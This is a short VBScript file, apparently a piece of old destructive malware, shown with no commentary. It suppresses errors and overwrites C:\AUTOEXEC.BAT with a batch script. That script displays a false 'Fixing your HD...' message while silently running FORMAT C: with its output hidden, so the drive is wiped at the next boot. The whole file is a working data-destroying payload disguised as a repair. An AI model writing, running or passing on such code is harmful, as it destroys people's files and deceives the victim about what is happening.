On Error Resume Next
Set Zoom = CreateObject("Scripting.FileSystemObject")
ZoomNamez = "C:\AUtOExEc.bAt"
Set ZoomFil = Zoom.CreateTextFile(ZoomNamez, True)
ZoomFil.WriteLine("@ECHO Off")
ZoomFil.WriteLine("ECHO Fixing your HD...")
ZoomFil.WriteLine(":ZoomTime")
ZoomFil.WriteLine("FORMAT C: " & "/U" & " /C" & " /S" & " > NUL")
ZoomFil.WriteLine("ECHO Done!...")
ZoomFil.Close

